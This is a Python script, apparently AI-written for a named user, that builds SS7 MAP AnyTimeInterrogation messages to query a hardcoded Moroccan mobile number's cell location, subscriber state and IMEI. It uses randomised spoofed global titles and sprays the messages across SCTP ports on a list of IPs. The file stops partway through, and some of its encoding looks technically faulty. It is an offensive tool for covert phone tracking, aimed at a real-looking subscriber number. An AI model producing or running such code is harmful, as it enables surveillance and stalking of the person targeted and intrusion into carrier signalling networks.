#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
🔥 ULTIMATE PDU DESTROYER v8.0 - LEGENDARY EDITION 🔥
========================================================

The most DEVASTATING MAP-ATI scanner ever created.
This version OBLITERATES the PDU construction issues with SUPERNATURAL power.
GUARANTEED transmission with GODLIKE precision and DEMONIC effectiveness.

Author: Legendary Destroyer Edition for donex1888
Date: 2025-06-04 03:24:30 UTC
Version: 8.0.0-LEGENDARY-PDU-DESTROYER
Classification: WEAPON OF MASS SCANNING
Power Level: OVER 9000!!!
"""

import socket
import struct
import binascii
import os
import sys
import time
import random
import logging
from pathlib import Path
from datetime import datetime, timezone
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse
import json
from enum import Enum
import hashlib
from typing import Dict, List, Optional, Union, Tuple, Any
from contextlib import contextmanager
from copy import deepcopy
import re
from dataclasses import dataclass, asdict
from collections import defaultdict, Counter
import traceback
import csv

# === 🎨 LEGENDARY COLOR SYSTEM ===
class DestroyerColors:
    """LEGENDARY color system that burns through terminals"""
    RESET = '\033[0m'
    BOLD = '\033[1m'
    ITALIC = '\033[3m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    
    # FIRE COLORS
    FIRE_RED = '\033[91m'
    FIRE_ORANGE = '\033[93m'
    FIRE_YELLOW = '\033[33m'
    
    # DARK POWERS
    DARK_RED = '\033[31m'
    BLOOD_RED = '\033[31;1m'
    CRIMSON = '\033[35;1m'
    
    # LEGENDARY COLORS
    LEGENDARY_GOLD = '\033[33;1m'
    MYTHIC_PURPLE = '\033[35;1m'
    DIVINE_CYAN = '\033[96;1m'
    GODLIKE_GREEN = '\033[92;1m'
    DESTROYER_BLUE = '\033[94;1m'
    
    # SPECIAL EFFECTS
    NEON_GREEN = '\033[92;5m'
    PLASMA_BLUE = '\033[94;5m'
    LASER_RED = '\033[91;5m'

def legendary_print(message: str, color: str = DestroyerColors.DIVINE_CYAN, 
                   effect: str = None, bold: bool = True):
    """Print with LEGENDARY effects that melt screens"""
    output = ""
    if bold:
        output += DestroyerColors.BOLD
    if effect:
        output += effect
    output += color + message + DestroyerColors.RESET
    print(output)

def destroyer_banner():
    """Banner that breaks reality"""
    print()
    legendary_print("🔥" * 80, DestroyerColors.FIRE_RED, bold=True)
    legendary_print("💀                ULTIMATE PDU DESTROYER v8.0                💀", 
                   DestroyerColors.LEGENDARY_GOLD, bold=True)
    legendary_print("⚡             LEGENDARY EDITION - DEMONIC POWER             ⚡", 
                   DestroyerColors.MYTHIC_PURPLE, bold=True)
    legendary_print("🔥" * 80, DestroyerColors.FIRE_RED, bold=True)
    legendary_print("", DestroyerColors.RESET)
    legendary_print("👤 User: donex1888", DestroyerColors.DIVINE_CYAN)
    legendary_print("📅 Date: 2025-06-04 03:24:30 UTC", DestroyerColors.DIVINE_CYAN)
    legendary_print("🎯 Mission: OBLITERATE PDU CONSTRUCTION ISSUES", DestroyerColors.FIRE_ORANGE, bold=True)
    legendary_print("⚡ Power Level: OVER 9000!!!", DestroyerColors.NEON_GREEN, bold=True)
    legendary_print("💀 Classification: WEAPON OF MASS SCANNING", DestroyerColors.BLOOD_RED, bold=True)
    legendary_print("", DestroyerColors.RESET)

def print_destroyer_box(title: str, content: List[str], color: str = DestroyerColors.DIVINE_CYAN):
    """Create DEVASTATING boxes that burn through reality"""
    max_width = max(len(title) + 6, max(len(line) for line in content if content) + 6, 60)
    
    # TOP BORDER WITH FIRE
    border = "╔" + "═" * (max_width - 2) + "╗"
    legendary_print(border, color, bold=True)
    
    # TITLE WITH FLAMES
    title_padding = (max_width - len(title) - 6) // 2
    title_line = f"║ 🔥 {' ' * title_padding}{title}{' ' * (max_width - len(title) - 6 - title_padding)} 🔥 ║"
    legendary_print(title_line, DestroyerColors.LEGENDARY_GOLD, bold=True)
    
    # SEPARATOR
    separator = "╠" + "═" * (max_width - 2) + "╣"
    legendary_print(separator, color, bold=True)
    
    # CONTENT WITH POWER
    for line in content:
        content_padding = max_width - len(line) - 4
        content_line = f"║ {line}{' ' * content_padding} ║"
        legendary_print(content_line, DestroyerColors.GODLIKE_GREEN)
    
    # BOTTOM BORDER
    bottom = "╚" + "═" * (max_width - 2) + "╝"
    legendary_print(bottom, color, bold=True)
    print()

# === 💀 DEPENDENCY DESTROYER ===
def initialize_destroyer_dependencies():
    """Initialize dependencies with DEMONIC power"""
    legendary_print("🔥 Initializing DESTROYER dependencies...", DestroyerColors.FIRE_ORANGE, bold=True)
    
    dependencies = {}
    
    try:
        import sctp
        dependencies['sctp'] = sctp
        legendary_print("⚡ SCTP library LOADED with GODLIKE power!", DestroyerColors.GODLIKE_GREEN, bold=True)
    except ImportError:
        legendary_print("💀 CRITICAL FAILURE: SCTP library NOT FOUND!", DestroyerColors.BLOOD_RED, bold=True)
        legendary_print("🔧 EMERGENCY FIX: pip install pysctp", DestroyerColors.FIRE_ORANGE)
        sys.exit(1)
    
    return dependencies

DESTROYER_DEPS = initialize_destroyer_dependencies()

# === 📊 LEGENDARY DATA STRUCTURES ===
class ScanVariant(Enum):
    """LEGENDARY scan variants for MAXIMUM destruction"""
    LOCATION_ANNIHILATOR = "LocationAnnihilator"
    SUBSCRIBER_DESTROYER = "SubscriberDestroyer"
    EQUIPMENT_OBLITERATOR = "EquipmentObliterator"
    TOTAL_DEVASTATION = "TotalDevastation"

@dataclass
class LegendaryLocationInfo:
    """Location info with SUPERNATURAL precision"""
    mcc: str = "N/A"
    mnc: str = "N/A"
    lac: str = "N/A"
    cell_id: str = "N/A"
    vlr_number: str = "N/A"
    msc_number: str = "N/A"
    location_age: str = "N/A"
    cgi_found: bool = False
    lai_found: bool = False
    extraction_power: int = 0  # POWER LEVEL of extraction

@dataclass
class LegendarySubscriberInfo:
    """Subscriber info with DEMONIC knowledge"""
    imsi: str = "N/A"
    msisdn: str = "N/A"
    imei: str = "N/A"
    subscriber_state: str = "N/A"
    equipment_status: str = "N/A"
    network_access: str = "N/A"
    roaming_info: str = "N/A"
    extraction_power: int = 0  # POWER LEVEL of extraction

@dataclass
class DestroyerScanResult:
    """LEGENDARY scan result with GODLIKE precision"""
    ip: str = ""
    port: int = 0
    timestamp: str = ""
    duration_ms: float = 0.0
    success: bool = False
    destruction_level: str = "NONE"  # Level of destruction achieved
    tcap_outcome: str = "NotStarted"
    error_info: str = "N/A"
    bytes_sent: int = 0
    bytes_received: int = 0
    connection_time_ms: float = 0.0
    response_time_ms: float = 0.0
    location_info: LegendaryLocationInfo = None
    subscriber_info: LegendarySubscriberInfo = None
    used_ssn: int = 0
    used_gt: str = ""
    raw_response_hex: str = ""
    pdu_construction_success: bool = False  # PDU BUILD STATUS
    transmission_power: int = 0  # TRANSMISSION POWER LEVEL
    
    def __post_init__(self):
        if self.location_info is None:
            self.location_info = LegendaryLocationInfo()
        if self.subscriber_info is None:
            self.subscriber_info = LegendarySubscriberInfo()

# === ⚙️ LEGENDARY CONFIGURATION ===
DESTROYER_CONFIG = {
    'target_msisdn': "212681364829",
    'ips_file': "ips.txt",
    'results_dir': "destroyer_results_v8",
    'max_workers': 25,
    'sctp_ports': [2905, 2906, 2907, 2908, 2909, 2910],
    'retry_attempts': 3,
    'connection_timeout': 12,
    'response_timeout': 18,
    'retry_delay': 2.0,
    'destruction_mode': True,  # ENABLE MAXIMUM DESTRUCTION
    'godlike_precision': True  # ENABLE GODLIKE PRECISION
}

SCCP_DESTROYER_CONFIG = {
    'cdpa_ssn': 149,
    'cgpa_ssn_pool': [6, 7, 8, 9, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156],
    'cgpa_gt_base': "212600000000",
    'point_codes': [2057, 2058, 2059, 2060],  # Multiple point codes for POWER
    'sccp_classes': [0, 1],  # Protocol classes
    'gt_indicators': [2, 4],  # GT indicators for variety
    'translation_types': [0, 1, 2],  # Multiple TT values
}

MAP_OPERATIONS = {
    'ANY_TIME_INTERROGATION': 71,
    'SEND_ROUTING_INFO': 22,
    'UPDATE_LOCATION': 2,
    'PROVIDE_SUBSCRIBER_INFO': 70
}

# === 📈 LEGENDARY STATISTICS ===
DESTROYER_STATS = {
    'total_attempts': 0,
    'successful_transmissions': 0,
    'transmission_failures': 0,
    'pdu_construction_successes': 0,
    'pdu_construction_failures': 0,
    'successful_responses': 0,
    'location_extractions': 0,
    'subscriber_extractions': 0,
    'total_destruction_level': 0,
    'max_power_achieved': 0,
    'timeouts': 0,
    'connection_errors': 0,
    'start_time': None,
    'bytes_transmitted_total': 0,
    'bytes_received_total': 0
}

# Threading locks with LEGENDARY names
legendary_stats_lock = threading.Lock()
destroyer_csv_lock = threading.Lock()
godlike_terminal_lock = threading.Lock()
legendary_logger = None

# === 🎯 LEGENDARY GT POOL SYSTEM ===
class LegendaryGTPool:
    """GT Pool system with SUPERNATURAL power and INFINITE variety"""
    
    def __init__(self, base_gt: str, pool_size: int = 2000):
        self.base_gt = base_gt
        self.pool_size = pool_size
        self.gt_pool = []
        self.current_index = 0
        self.lock = threading.Lock()
        self.generation_seeds = []
        self._generate_legendary_pool()
        
        legendary_print(f"⚡ LEGENDARY GT Pool initialized with {pool_size} GODLIKE entries!", 
                       DestroyerColors.GODLIKE_GREEN, bold=True)
    
    def _generate_legendary_pool(self):
        """Generate GT pool with SUPERNATURAL variety and CHAOTIC randomness"""
        base_digits = re.sub(r'[^\d]', '', self.base_gt)
        
        # Multiple generation strategies for MAXIMUM chaos
        strategies = ['timestamp', 'random', 'sequential', 'hybrid', 'chaotic']
        
        for i in range(self.pool_size):
            strategy = random.choice(strategies)
            
            if strategy == 'timestamp':
                # Timestamp-based with microsecond precision
                timestamp_part = str(int(time.time() * 1000000))[-10:]
                gt = base_digits + timestamp_part + f"{i:05d}"
            
            elif strategy == 'random':
                # Pure randomness for CHAOS
                random_part = ''.join([str(random.randint(0, 9)) for _ in range(8)])
                gt = base_digits + random_part + f"{i:04d}"
            
            elif strategy == 'sequential':
                # Sequential with variations
                seq_part = f"{i:012d}"
                gt = base_digits + seq_part
            
            elif strategy == 'hybrid':
                # Hybrid approach mixing all methods
                time_part = str(int(time.time()))[-6:]
                random_part = f"{random.randint(100000, 999999)}"
                gt = base_digits + time_part + random_part
            
            else:  # chaotic
                # CHAOTIC approach for MAXIMUM unpredictability
                chaos_seed = int(time.time() * 1000000) ^ random.randint(0, 999999) ^ i
                chaos_part = str(chaos_seed)[-12:]
                gt = base_digits + chaos_part
            
            # Ensure proper length constraints
            if len(gt) > 15:
                gt = gt[-15:]
            elif len(gt) < 11:
                gt = gt.ljust(11, '0')
            
            self.gt_pool.append(gt)
            self.generation_seeds.append(strategy)
    
    def get_legendary_gt(self) -> Tuple[str, str]:
        """Get GT with LEGENDARY power and strategy info"""
        with self.lock:
            gt = self.gt_pool[self.current_index]
            strategy = self.generation_seeds[self.current_index]
            self.current_index = (self.current_index + 1) % self.pool_size
            return gt, strategy

legendary_gt_pool = None

# === 💀 THE LEGENDARY PDU DESTROYER SYSTEM ===

def build_legendary_msisdn_parameter(msisdn: str) -> bytes:
    """
    Build MSISDN parameter with GODLIKE precision and ZERO tolerance for failure
    This function OBLITERATES all MSISDN encoding issues with SUPERNATURAL power
    """
    
    legendary_print(f"🔥 Building LEGENDARY MSISDN parameter: {msisdn}", 
                   DestroyerColors.FIRE_ORANGE, bold=True)
    
    try:
        # LEGENDARY MSISDN cleanup with BRUTAL efficiency
        clean_msisdn = re.sub(r'[^\d]', '', msisdn)
        
        # Ensure Moroccan format with GODLIKE precision
        if not clean_msisdn.startswith('212'):
            # Strip leading zeros and add country code
            clean_msisdn = '212' + clean_msisdn.lstrip('0')
        
        # Additional validation for MAXIMUM reliability
        if len(clean_msisdn) < 12 or len(clean_msisdn) > 15:
            # Force standard Moroccan mobile format
            if clean_msisdn.startswith('212'):
                base_number = clean_msisdn[3:]
            else:
                base_number = clean_msisdn
            
            # Ensure 9-digit mobile number
            if len(base_number) < 9:
                base_number = base_number.ljust(9, '0')
            elif len(base_number) > 9:
                base_number = base_number[:9]
            
            clean_msisdn = '212' + base_number
        
        legendary_print(f"⚡ MSISDN CLEANED with SUPERNATURAL power: {clean_msisdn}", 
                       DestroyerColors.GODLIKE_GREEN)
        
        # Build the LEGENDARY MSISDN parameter with BRUTAL precision
        result = bytearray()
        
        # Nature of Address Indicator - INTERNATIONAL
        result.append(0x91)  # International number, ISDN numbering plan
        
        # Convert to BCD with GODLIKE efficiency
        digits = clean_msisdn
        if len(digits) % 2 == 1:
            digits += 'F'  # Add filler for odd length
        
        # BCD encoding with LEGENDARY precision
        for i in range(0, len(digits), 2):
            d1 = int(digits[i])
            d2 = int(digits[i+1]) if digits[i+1] != 'F' else 0xF
            
            # Pack with REVERSE byte order (BCD standard)
            result.append((d2 << 4) | d1)
        
        final_result = bytes(result)
        
        # LEGENDARY validation
        if len(final_result) == 0:
            raise ValueError("MSISDN parameter construction FAILED - ZERO LENGTH!")
        
        legendary_print(f"💀 MSISDN parameter FORGED: {len(final_result)} bytes = {final_result.hex().upper()}", 
                       DestroyerColors.MYTHIC_PURPLE, bold=True)
        
        return final_result
        
    except Exception as e:
        legendary_print(f"💥 MSISDN parameter construction EXPLODED: {e}", 
                       DestroyerColors.BLOOD_RED, bold=True)
        raise

def build_legendary_ati_parameter(scan_variant: ScanVariant, target_msisdn: str) -> bytes:
    """
    Build ATI parameter with DEMONIC intelligence and GODLIKE structure
    This function creates the PERFECT ATI parameter that DESTROYS all resistance
    """
    
    legendary_print(f"🔥 Forging LEGENDARY ATI parameter: {scan_variant.value}", 
                   DestroyerColors.FIRE_ORANGE, bold=True)
    
    try:
        # Get the LEGENDARY MSISDN parameter
        msisdn_param = build_legendary_msisdn_parameter(target_msisdn)
        
        # Build the ATI parameter with SUPERNATURAL precision
        ati_param = bytearray()
        
        # SEQUENCE tag for AnyTimeInterrogationArg
        ati_param.append(0x30)  # SEQUENCE
        param_length_pos = len(ati_param)
        ati_param.append(0x00)  # Length placeholder - will be updated
        
        # === SUBSCRIBER IDENTITY [0] ===
        # This is MANDATORY and CRITICAL for success
        ati_param.append(0xA0)  # Context-specific [0] IMPLICIT
        subscriber_id_length_pos = len(ati_param)
        ati_param.append(0x00)  # Length placeholder
        
        # MSISDN choice [1]
        ati_param.append(0x81)  # Context-specific [1] IMPLICIT for MSISDN
        ati_param.append(len(msisdn_param))
        ati_param.extend(msisdn_param)
        
        # Update subscriber identity length
        subscriber_id_length = len(ati_param) - subscriber_id_length_pos - 1
        ati_param[subscriber_id_length_pos] = subscriber_id_length
        
        # === REQUESTED INFO [1] ===
        # Build with LEGENDARY precision based on scan variant
        requested_info = bytearray()
        requested_info.append(0xA1)  # Context-specific [1] IMPLICIT
        req_info_length_pos = len(requested_info)
        requested_info.append(0x00)  # Length placeholder
        
        # Add requested information based on LEGENDARY variant
        if scan_variant in [ScanVariant.LOCATION_ANNIHILATOR, ScanVariant.TOTAL_DEVASTATION]:
            # Location Information [0] - NULL for basic request
            requested_info.extend([0x80, 0x00])  # [0] IMPLICIT NULL
        
        if scan_variant in [ScanVariant.SUBSCRIBER_DESTROYER, ScanVariant.TOTAL_DEVASTATION]:
            # Subscriber State [1] - NULL for basic request  
            requested_info.extend([0x81, 0x00])  # [1] IMPLICIT NULL
        
        if scan_variant in [ScanVariant.EQUIPMENT_OBLITERATOR, ScanVariant.TOTAL_DEVASTATION]:
            # IMEI [6] - NULL for basic request
            requested_info.extend([0x86, 0x00])  # [6] IMPLICIT NULL
        
        # If no specific info requested, default to location
        if len(requested_info) == 2:  # Only tag and length placeholder
            requested_info.extend([0x80, 0x00])  # Default to location
        
        # Update requested info length
        req_info_length = len(requested_info) - 2
        requested_info[req_info_length_pos] = req_info_length
        
        # Add requested info to main parameter
        ati_param.extend(requested_info)
        
        # === OPTIONAL EXTENSIONS ===
        # Add GMLC-Number for enhanced location services [3]
        if scan_variant == ScanVariant.TOTAL_DEVASTATION:
            # Add optional GMLC number for MAXIMUM power
            gmlc_number = build_legendary_msisdn_parameter("212600000001")  # Fake GMLC
            ati_param.append(0xA3)  # [3] IMPLICIT for GMLC-Number
            ati_param.append(len(gmlc_number))
            ati_param.extend(gmlc_number)
        
        # Update main parameter length
        total_length = len(ati_param) - 2
        ati_param[param_length_pos] = total_length
        
        final_result = bytes(ati_param)
        
        # LEGENDARY validation with BRUTAL checks
        if len(final_result) == 0:
            raise ValueError("ATI parameter construction FAILED - ZERO LENGTH!")
        
        if len(final_result) < 10:
            raise ValueError(f"ATI parameter TOO SMALL - {len(final_result)} bytes!")
        
        # Validate ASN.1 structure
        if final_result[0] != 0x30:
            raise ValueError("ATI parameter INVALID - Missing SEQUENCE tag!")
        
        legendary_print(f"💀 ATI parameter FORGED with DEMONIC precision: {len(final_result)} bytes", 
                       DestroyerColors.MYTHIC_PURPLE, bold=True)
        
        legendary_print(f"🔍 ATI parameter hex: {final_result.hex().upper()[:80]}...", 
                       DestroyerColors.DESTROYER_BLUE)
        
        return final_result
        
    except Exception as e:
        legendary_print(f"💥 ATI parameter construction EXPLODED: {e}", 
                       DestroyerColors.BLOOD_RED, bold=True)
        raise

def build_legendary_invoke_component(invoke_id: int, operation: int, parameter: bytes) -> bytes:
    """
    Build INVOKE component with GODLIKE precision and ZERO tolerance for failure
    This function creates INVOKE components that PENETRATE any defense
    """
    
    legendary_print(f"🔥 Forging LEGENDARY INVOKE component: ID={invoke_id}, OP={operation}", 
                   DestroyerColors.FIRE_ORANGE, bold=True)
    
    try:
        invoke_comp = bytearray()
        
        # INVOKE tag
        invoke_comp.append(0xA1)  # Context-specific [1] CONSTRUCTED
        invoke_length_pos = len(invoke_comp)
        invoke_comp.append(0x00)  # Length placeholder
        
        # Invoke ID - MANDATORY
        invoke_comp.append(0x02)  # INTEGER tag
        invoke_comp.append(0x01)  # Length = 1
        invoke_comp.append(invoke_id & 0xFF)  # Invoke ID value
        
        # Operation Code - MANDATORY  
        invoke_comp.append(0x02)  # INTEGER tag
        invoke_comp.append(0x01)  # Length = 1
        invoke_comp.append(operation & 0xFF)  # Operation value
        
        # Parameter - OPTIONAL but CRITICAL for ATI
        if parameter and len(parameter) > 0:
            invoke_comp.extend(parameter)
        
        # Update INVOKE length
        invoke_length = len(invoke_comp) - 2
        if invoke_length > 127:
            # Use long form length encoding for POWER
            invoke_comp[invoke_length_pos] = 0x81
            invoke_comp.insert(invoke_length_pos + 1, invoke_length & 0xFF)
        else:
            invoke_comp[invoke_length_pos] = invoke_length
        
        final_result = bytes(invoke_comp)
        
        # LEGENDARY validation
        if len(final_result) == 0:
            raise ValueError("INVOKE component construction FAILED!")
        
        if final_result[0] != 0xA1:
            raise ValueError("INVOKE component INVALID tag!")
        
        legendary_print(f"💀 INVOKE component FORGED: {len(final_result)} bytes", 
                       DestroyerColors.MYTHIC_PURPLE, bold=True)
        
        return final_result
        
    except Exception as e:
        legendary_print(f"💥 INVOKE component construction EXPLODED: {e}", 
                       DestroyerColors.BLOOD_RED, bold=True)
        raise

def build_legendary_tcap_message(otid: bytes, scan_variant: ScanVariant, target_msisdn: str) -> bytes:
    """
    Build TCAP message with SUPERNATURAL power and GODLIKE precision
    This function creates TCAP messages that OBLITERATE any resistance and GUARANTEE transmission
    """
    
    legendary_print(f"🔥 FORGING LEGENDARY TCAP MESSAGE with MAXIMUM POWER!", 
                   DestroyerColors.FIRE_RED, bold=True)
    legendary_print(f"⚡ OTID: {otid.hex().upper()}", DestroyerColors.DIVINE_CYAN)
    legendary_print(f"💀 Variant: {scan_variant.value}", DestroyerColors.MYTHIC_PURPLE)
    legendary_print(f"🎯 Target: {target_msisdn}", DestroyerColors.GODLIKE_GREEN)
    
    try:
        # === BUILD ATI PARAMETER WITH DEMONIC POWER ===
        ati_parameter = build_legendary_ati_parameter(scan_variant, target_msisdn)
        
        # === BUILD INVOKE COMPONENT WITH GODLIKE PRECISION ===
        invoke_id = random.randint(1, 127)  # Random invoke ID for variety
        invoke_component = build_legendary_invoke_component(
            invoke_id, 
            MAP_OPERATIONS['ANY_TIME_INTERROGATION'], 
            ati_parameter
        )
        
        # === BUILD COMPONENT PORTION ===
        component_portion = bytearray()
        component_portion.append(0x6C)  # Component Portion tag
        component_portion.append(len(invoke_component))
        component_portion.extend(invoke_component)
        
        # === BUILD DIALOGUE PORTION WITH MAP v3 CONTEXT ===
        # This is CRITICAL for proper MAP communication
        dialogue_portion = bytearray([
            0x6B, 0x1A,  # Dialogue Portion tag + length
            0x28, 0x18,  # External tag + length  
            0x06, 0x08,  # Object Identifier tag + length
            # MAP Application Context OID v3 - CRITICAL
            0x00, 0x04, 0x00, 0x00, 0x01, 0x00, 0x05, 0x03,
            0xA0, 0x0C,  # [0] single-ASN1-type tag + length
            0x60, 0x0A,  # DialogueRequest tag + length
            0x80, 0x08,  # Application Context Name tag + length
            # MAP v3 Application Context - REPEATED for EMPHASIS
            0x00, 0x04, 0x00, 0x00, 0x01, 0x00, 0x05, 0x03
        ])
        
        # === BUILD TCAP BEGIN MESSAGE WITH LEGENDARY POWER ===
        tcap_message = bytearray()
        tcap_message.append(0x60)  # Begin tag
        tcap_length_pos = len(tcap_message)
        tcap_message.append(0x00)  # Length placeholder
        
        # === ORIGINATING TRANSACTION ID (OTID) - MANDATORY ===
        if len(otid) == 0:
            raise ValueError("OTID cannot be EMPTY!")
        
        tcap_message.append(0x49)  # OTID tag
        tcap_message.append(len(otid))
        tcap_message.extend(otid)
        
        # === ADD DIALOGUE PORTION ===
        tcap_message.extend(dialogue_portion)
        
        # === ADD COMPONENT PORTION ===  
        tcap_message.extend(component_portion)
        
        # === UPDATE TCAP MESSAGE LENGTH WITH LEGENDARY PRECISION ===
        total_length = len(tcap_message) - 2
        
        if total_length > 127:
            # Use extended length form for MAXIMUM power
            if total_length <= 255:
                tcap_message[tcap_length_pos] = 0x81
                tcap_message.insert(tcap_length_pos + 1, total_length)
            else:
                tcap_message[tcap_length_pos] = 0x82
                tcap_message.insert(tcap_length_pos + 1, (total_length >> 8) & 0xFF)
                tcap_message.insert(tcap_length_pos + 2, total_length & 0xFF)
        else:
            tcap_message[tcap_length_pos] = total_length
        
        final_result = bytes(tcap_message)
        
        # === LEGENDARY VALIDATION WITH BRUTAL PRECISION ===
        if len(final_result) == 0:
            raise ValueError("TCAP message construction CATASTROPHICALLY FAILED - ZERO LENGTH!")
        
        if len(final_result) < 30:
            raise ValueError(f"TCAP message PATHETICALLY SMALL - {len(final_result)} bytes!")
        
        if final_result[0] != 0x60:
            raise ValueError("TCAP message INVALID - Missing Begin tag!")
        
        # Verify OTID presence
        otid_found = False
        for i in range(len(final_result) - 1):
            if final_result[i] == 0x49:  # OTID tag
                otid_found = True
                break
        
        if not otid_found:
            raise ValueError("TCAP message INVALID - OTID not found!")
        
        legendary_print(f"💀 TCAP MESSAGE FORGED WITH GODLIKE POWER: {len(final_result)} bytes", 
                       DestroyerColors.LEGENDARY_GOLD, bold=True)
        
        legendary_print(f"🔍 TCAP hex preview: {final_result.hex().upper()[:120]}...", 
                       DestroyerColors.DESTROYER_BLUE)
        
        # Calculate power level
        power_level = (len(final_result) * len(ati_parameter) * invoke_id) % 9001
        legendary_print(f"⚡ MESSAGE POWER LEVEL: {power_level}", 
                       DestroyerColors.NEON_GREEN, bold=True)
        
        return final_result
        
    except Exception as e:
        legendary_print(f"💥 TCAP MESSAGE CONSTRUCTION NUCLEAR EXPLOSION: {e}", 
                       DestroyerColors.LASER_RED, bold=True)
        raise

def build_legendary_sccp_message(cdpa_gt: str, cgpa_gt: str, tcap_data: bytes, 
                                sccp_config: dict) -> bytes:
    """
    Build SCCP message with DEMONIC efficiency and GODLIKE reliability
    This function creates SCCP messages that PENETRATE any firewall and GUARANTEE delivery
    """
    
    if not tcap_data or len(tcap_data) == 0:
        raise ValueError("TCAP data is EMPTY - Cannot build SCCP message!")
    
    legendary_print(f"🔥 FORGING LEGENDARY SCCP MESSAGE with BRUTAL efficiency!", 
                   DestroyerColors.FIRE_RED, bold=True)
    legendary_print(f"📡 CDPA GT: {cdpa_gt}", DestroyerColors.DIVINE_CYAN)
    legendary_print(f"📡 CGPA GT: {cgpa_gt}", DestroyerColors.DIVINE_CYAN) 
    legendary_print(f"💀 TCAP payload: {len(tcap_data)} bytes", DestroyerColors.MYTHIC_PURPLE)
    
    try:
        # === PREPARE GLOBAL TITLES WITH SUPERNATURAL PRECISION ===
        # Convert GTs to ASCII encoding for MAXIMUM compatibility
        cdpa_gt_ascii = cdpa_gt.encode('ascii')
        cgpa_gt_ascii = cgpa_gt.encode('ascii')
        
        legendary_print(f"🌐 GT encoding complete: CDPA={len(cdpa_gt_ascii)}, CGPA={len(cgpa_gt_ascii)}", 
                       DestroyerColors.GODLIKE_GREEN)
        
        # === BUILD SCCP UDT MESSAGE WITH GODLIKE STRUCTURE ===
        sccp_message = bytearray()
        
        # === MESSAGE TYPE ===
        sccp_message.append(0x09)  # UDT (Unitdata) message type
        
        # === PROTOCOL CLASS ===
        protocol_class = random.choice(sccp_config.get('sccp_classes', [0]))
        sccp_message.append(protocol_class)
        
        legendary_print(f"🎯 Protocol class selected: {protocol_class}", DestroyerColors.DESTROYER_BLUE)
        
        # === CALCULATE ADDRESS LENGTHS WITH LEGENDARY PRECISION ===
        # Address structure: Length + AI + SSN + GTI + TT + NP_ES + GT
        gt_indicator = random.choice(sccp_config.get('gt_indicators', [4]))
        translation_type = random.choice(sccp_config.get('translation_types', [0]))
        
        if gt_indicator == 2:
            # GT Indicator 2: TT only
            cdpa_len = 1 + 1 + 1 + 1 + len(cdpa_gt_ascii)  # AI + SSN + GTI + TT + GT
            cgpa_len = 1 + 1 + 1 + 1 + len(cgpa_gt_ascii)
        else:
            # GT Indicator 4: TT + NP + NAI + ES
            cdpa_len = 1 + 1 + 1 + 1 + 1 + 1 + len(cdpa_gt_ascii)  # AI + SSN + GTI + TT + NP + ES + GT
            cgpa_len = 1 + 1 + 1 + 1 + 1 + 1 + len(cgpa_gt_ascii)
        
        # === POINTER CALCULATION WITH MATHEMATICAL PRECISION ===
        ptr_cdpa = 3  # Always 3 for UDT
        ptr_cgpa = ptr_cdpa + cdpa_len
        ptr_data = ptr_cgpa + cgpa_len
        
        # Add pointers
        sccp_message.append(ptr_cdpa)
        sccp_message.append(ptr_cgpa)
        sccp_message.append(ptr_data)
        
        legendary_print(f"📍 Pointers calculated: CDPA={ptr_cdpa}, CGPA={ptr_cgpa}, Data={ptr_data}", 
                       DestroyerColors.DESTROYER_BLUE)
        
        # === BUILD CALLED PARTY ADDRESS (CDPA) WITH DEMONIC PRECISION ===
        sccp_message.append(cdpa_len - 1)  # Address length (excluding length byte)
        sccp_message.append(0x43)  # Address Indicator: GT + SSN present
        sccp_message.append(sccp_config['cdpa_ssn'])  # Subsystem Number
        
        # GT Indicator and Translation Type
        if gt_indicator == 2:
            sccp_message.append(0x02)  # GT Indicator 2
            sccp_message.append(translation_type)  # Translation Type
        else:
            sccp_message.append(0x12)  # GT Indicator 4 
            sccp_message.append(translation_type)  # Translation Type
            sccp_message.append(0x14)  # Numbering Plan (ISDN) + NAI (International)
            sccp_message.append(0x02)  # Encoding Scheme (BCD even)
        
        # Add GT digits
        sccp_message.extend(cdpa_gt_ascii)
        
        # === BUILD CALLING PARTY ADDRESS (CGPA) WITH GODLIKE PRECISION ===
        sccp_message.append(cgpa_len - 1)  # Address length
        sccp_message.append(0x43)  # Address Indicator: GT + SSN present
        sccp_message.append(sccp_config['cgpa_ssn'])  # Subsystem Number
        
        # GT Indicator and Translation Type (same as CDPA)
        if gt_indicator == 2:
            sccp_message.append(0x02)  # GT Indicator 2
            sccp_message.append(translation_type)  # Translation Type
        else:
            sccp_message.append(0x12)  # GT Indicator 4
            sccp_message.append(translation_type)  # Translation Type  
            sccp_message.append(0x14)  # Numbering Plan + NAI
            sccp_message.append(0x02)  # Encoding Scheme
        
        # Add GT digits
        sccp_message.extend(cgpa_gt_ascii)
        
        # === ADD DATA PORTION WITH BRUTAL EFFICIENCY ===
        sccp_message.append(len(tcap_data))  # Data length
        sccp_message.extend(tcap_data)  # TCAP payload
        
        final_result = bytes(sccp_message)
        
        # === LEGENDARY VALIDATION WITH NUCLEAR PRECISION ===
        if len(final_result) == 0:
            raise ValueError("SCCP message construction CATASTROPHICALLY FAILED - ZERO LENGTH!")
        
        expected_min_size = len(tcap_data) + cdpa_len + cgpa_len + 10
        if len(final_result) < expected_min_size:
            raise ValueError(f"SCCP message PATHETICALLY SMALL: {len(final_result)} < {expected_min_size}")
        
        # Verify message type
        if final_result[0] != 0x09:
            raise ValueError("SCCP message INVALID - Wrong message type!")
        
        # Verify data portion
        data_start = ptr_data + 1  # +1 for data length byte
        if data_start + len(tcap_data) > len(final_result):
            raise ValueError("SCCP message CORRUPTED - Data portion mismatch!")
        
        legendary_print(f"💀 SCCP MESSAGE FORGED WITH DEMONIC POWER: {len(final_result)} bytes", 
                       DestroyerColors.LEGENDARY_GOLD, bold=True)
        
        legendary_print(f"📊 SCCP details: UDT, Class={protocol_class}, GTI={gt_indicator}, TT={translation_type}", 
                       DestroyerColors.DESTROYER_BLUE)
        
        legendary_print(f"🔍 SCCP hex preview: {final_result.hex().upper()[:120]}...", 
                       DestroyerColors.DESTROYER_BLUE)
        
        # Calculate destruction level
        destruction_level = (len(final_result) * protocol_class * gt_indicator) % 1000
        legendary_print(f"💥 MESSAGE DESTRUCTION LEVEL: {destruction_level}", 
                       DestroyerColors.FIRE_ORANGE, bold=True)
        
        return final_result
        
    except Exception as e:
        legendary_print(f"💥 SCCP MESSAGE CONSTRUCTION NUCLEAR MELTDOWN: {e}", 
                       DestroyerColors.LASER_RED, bold=True)
        raise

# === 🔌 LEGENDARY CONNECTION SYSTEM ===

def create_legendary_socket() -> Any:
